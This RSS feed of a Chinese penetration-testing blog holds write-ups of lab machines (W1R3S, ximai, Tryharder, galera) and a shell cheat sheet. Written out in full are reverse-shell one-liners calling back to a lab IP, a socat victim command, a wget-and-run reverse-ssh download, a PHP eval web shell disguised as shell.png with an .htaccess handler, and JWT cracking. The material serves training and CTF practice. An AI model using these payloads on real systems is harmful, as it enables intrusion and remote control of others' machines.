<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Mon, 21 Jul 2025 18:01:17 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>vulnhub-w1r3s</title><link>https://dehua-rd.github.io/post/vulnhub-w1r3s.html</link><description># &lt;font color='red'&gt;靶机信息&lt;/font&gt;
W1R3S是vulnhub中的一台中等难度的靶机
# &lt;font color='red'&gt;初始侦察&lt;/font&gt;
## &lt;font color='yellow'&gt;靶机扫描&lt;/font&gt;
```
sudo nmap -sT -p- --min-rate 1000 $ip -oA tcpScan
sudo nmap -sU -p- --min-rate 10000 $ip -oA udpScan
```
tcp和udp可以扫描两遍以防止失误

```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/nmap_scan]
└─# grep open tcpScan.nmap | awk -F'/' '{print $1}' | paste -sd, 
21,22,80,3306
```
`ports=$(grep open tcpScan.nmap | awk -F'/' '{print $1}' | paste -sd,)`
格式化端口方便后续使用

`sudo nmap -sCV -O -sT -p$ports $ip -oA detail`
对上述扫描open的端口进行最详细的一次扫描并保存结果

```
# Nmap 7.95 scan initiated Mon Jul 21 10:50:28 2025 as: /usr/lib/nmap/nmap -sCV -sT -O -p21,22,80,3306 -oA detail 192.168.218.189
Nmap scan report for 192.168.218.189
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.218.148
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:AA:7F:FC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 4.10 (91%), Linux 4.4 (91%), OpenWrt 19.07 (Linux 4.14) (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 21 10:50:48 2025 -- 1 IP address (1 host up) scanned in 20.49 seconds
                                                                                              
```
同时也可以使用参数--script=vuln进行漏洞扫描，不多展示

# 信息利用
## ftp枚举
```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# ftp $ip            
Connected to 192.168.218.189.
220 Welcome to W1R3S.inc FTP service.
Name (192.168.218.189:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; binary
200 Switching to Binary mode.
ftp&gt; 
``` 
直接使用匿名尝试连接登录，成功登录记得使用二进制传输模式，防止get可执行文件时放生错误，使用prompt关闭交互，使用mget，下载多个文件，将ftp中的所有文件get下来。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/vulnhub-w1r3s.html</guid><pubDate>Mon, 21 Jul 2025 18:00:53 +0000</pubDate></item><item><title>密码利用相关笔记</title><link>https://dehua-rd.github.io/post/mi-ma-li-yong-xiang-guan-bi-ji.html</link><description># 加解密

## openssl
openssl是一个强大的加密工具包，支持多种加密、解密、摘要、证书生成等操作，广泛用于安全测试、渗透测试和开发中。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/mi-ma-li-yong-xiang-guan-bi-ji.html</guid><pubDate>Mon, 21 Jul 2025 16:55:21 +0000</pubDate></item><item><title>ximai</title><link>https://dehua-rd.github.io/post/ximai.html</link><description># Hackmyvm ximai靶机


`port=$(nmap -T4 --min-rate=1000 -p- 192.168.250.66 | awk '/^[0-9]/ {print $1}' | cut -d'/' -f1 | paste -sd,) &amp;&amp; nmap -sV -p $port $ip`

&gt;Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 10:04 EDT
Nmap scan report for 192.168.250.66
Host is up (0.00061s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
25/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
110/tcp  open  tcpwrapped
3306/tcp open  mysql      MariaDB 10.3.23 or earlier (unauthorized)
8000/tcp open  http       Apache httpd 2.4.62 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&gt;Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds

先看两个http端口，80端口没东西扫描一下目录
有一个reminder.php页面有提示


username字段有mysql报错，但是用sqlmap没有爆出东西。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/ximai.html</guid><pubDate>Wed, 09 Jul 2025 21:29:10 +0000</pubDate></item><item><title>shell相关</title><link>https://dehua-rd.github.io/post/shell-xiang-guan.html</link><description>## 交互shell
`rlwrap -cAr nc -lvnp 1234`
&gt;rlwrap: 为命令行提供 readline 功能（历史记录、行编辑等）
&gt;-c: 启用命令完成
&gt;-A: 自动完成文件名
&gt;-r: 记住输入历史

## 升级完全shell
`python3 -c 'import pty;pty.spawn('/bin/bash')'`
&gt;使用 Python 生成一个伪终端 (pty) 并启动 bash
&gt;伪终端模拟了真实终端的特性，包括:
&gt;行缓冲(Line buffering)
&gt;信号处理(Signal handling)
&gt;作业控制(Job control)
&gt;这使Shell获得终端特性(TTY特性)

`export SHELL=bash`
&gt;设置正确的Shell环境变量
&gt;确保系统知道当前使用的是Bash
&gt;影响某些应用程序的Shell调用行为

`export TERM=xterm-256color` 
&gt;设置终端类型
&gt;使Shell支持:
&gt;高级终端功能
&gt;颜色显示
&gt;特殊按键响应

**ctrl+z**
&gt;作用：挂起当前Shell进程
&gt;发送SIGTSTP信号
&gt;为后续终端设置做准备

`stty raw -echo;fg`
&gt;配置终端原始模式
&gt;raw模式：禁用输入处理，直接传递原始数据
&gt;-echo：禁用回显(避免双重回显)
&gt;fg：将挂起的进程带回前台

`reset`
&gt;作用：重置终端设置
&gt;清除可能的错误配置
&gt;确保终端处于干净状态
&gt;重新初始化终端驱动

## socat
#### Listener:
`socat file:`tty`,raw,echo=0 tcp-listen:4444`
#### Victim:
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`



## 反向shell
`bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1`
不支持/dev/tcp
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f`

## 生成shell
`python -c 'import pty; pty.spawn('/bin/sh')'`
`echo os.system('/bin/bash')`
`/bin/sh -i`
`script -qc /bin/bash /dev/null`
`perl -e 'exec '/bin/sh';'`
`perl: exec '/bin/sh';`
`ruby: exec '/bin/sh'`
`lua: os.execute('/bin/sh')`
`IRB: exec '/bin/sh'`
`vi: :!bash`
`vi: :set shell=/bin/bash:shell`
`nmap: !sh`


## 反向ssh
#### 在目标机上使用
`wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh &amp;&amp; chmod +x /dev/shm/reverse-ssh`
`/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2`。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/shell-xiang-guan.html</guid><pubDate>Tue, 08 Jul 2025 13:19:22 +0000</pubDate></item><item><title>Tryharder</title><link>https://dehua-rd.github.io/post/Tryharder.html</link><description># Tryharder

&gt; 日期：2025-07-04 ｜ 作者：dehua ｜ 标签：hvm，jwt， LD_PRELOAD

---

## 信息收集阶段

首先对目标进行端口扫描，发现开放的服务如下：

```bash
nmap -sCV -p- 192.168.218.185
```

```text
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: 西溪湖科技 - 企业门户网站
```

---

## 漏洞利用过程

主页是一个静态页面，啥也干不了，看源码有发现 API 路径，像是 Base64 编码：

&lt;img width='936' height='328' alt='Image' src='https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1' /&gt;

```bash
echo 'NzQyMjE=' | base64 -d
# 输出：74221
```

访问 `/74221/` 是一个登录页面，继续进行目录扫描：

```bash
gobuster dir -u http://192.168.218.185/74221/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
```

```text
/uploads              (Status: 301)
/index.php            (Status: 200)
/dashboard.php        (Status: 302)
```

登录账号：test  密码：123456

&lt;img width='1840' height='939' alt='Image' src='https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3' /&gt;



登录后发现是 JWT 身份验证，抓取 token 后尝试使用 hashcat 破解：


```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

```text
候选密钥：jwtsecret123
```

&lt;img width='1919' height='616' alt='Image' src='https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec' /&gt;

&lt;img width='1915' height='608' alt='Image' src='https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d' /&gt;

忘截图了，上面token中的sub是上传目录把123改成999，不然可能上传不成功
使用伪造 token 后页面出现上传功能，上传如下两个文件：

**shell.png**

```php
&lt;?php @eval($_POST['cmd']); ?&gt;
```

**.htaccess**

```apache
&lt;IfModule mime_module&gt;
	AddHandler php5-script .png
	SetHandler application/x-httpd-php
&lt;/IfModule&gt;
```

访问 payload 后执行：

&lt;img width='917' height='111' alt='Image' src='https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5' /&gt;

```php
cmd=system('/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp;/dev/tcp/192.168.218.148/1234 0&gt;&amp;1'');
```

&lt;img width='924' height='221' alt='Image' src='https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1' /&gt;

## 权限提升分析

在 pentester 用户主目录中找到 `.note` 文件，结合 `/etc/passwd` 中的信息
但是我是想了很久也不知道这在提示什么，还是GPT好使，GPT告诉我可能与加密，隐写，凯撒密码这些有关，然后我开始对照这些语句的原文开始猜测，然后又浪费了很多时间，也没解出来，最后看了佬的wp，原来是找隐藏文件

```bash
find / -name '.*' 2&gt;/dev/null | grep -v sys
```
先看/srv
```bash
www-data@Tryharder:/srv$ cat ...
Iuwbtthfbetuoftimfs'iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
```
看着跟passwd中的提示很像，可能是移位密码
再看看secret中的提示
```bash
www-data@Tryharder:/var/backups/.secret/.verysecret/.noooooo$ cat note2.txt 
```

问了一手gpt：
•	方法 1：第一段 = 第二段 + 固定位移（如凯撒 +5）。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/Tryharder.html</guid><pubDate>Sat, 05 Jul 2025 07:07:38 +0000</pubDate></item><item><title>galera</title><link>https://dehua-rd.github.io/post/galera.html</link><description># Galera HVM

&gt; 日期：2025-07-02 ｜ 作者：dehua ｜ 标签：第一个wp博客，有什么改进的可以留下评论

---

## 信息收集阶段

首先对目标进行端口扫描，发现开放的服务如下：

```bash
nmap -sC -sV -A 192.168.1.100
```

```
22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
| 256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)
|_256 f3:fa:a1:84:c6:da:fc:09:fe:aa:ca:ec:0a:29:7d:30 (ED25519)
80/tcp open http Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Login
4567/tcp open tram?
```

---

## 漏洞利用过程

发现 80 端口是一个登录页面，进行目录扫描：

```bash
gobuster dir -u http://192.168.218.181/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
```

```
/login.php (Status: 302) [--&gt; /]
/logout.php (Status: 302) [--&gt; index.php]
/config.php (Status: 200)
/upload (Status: 301) [--&gt; /upload/]
/private.php (Status: 403)
/info.php (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
```

&gt; 发现一个 `info.php` 页面，是标准的 PHP 配置信息页面；其他页面基本无用。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/galera.html</guid><pubDate>Wed, 02 Jul 2025 15:05:57 +0000</pubDate></item></channel></rss>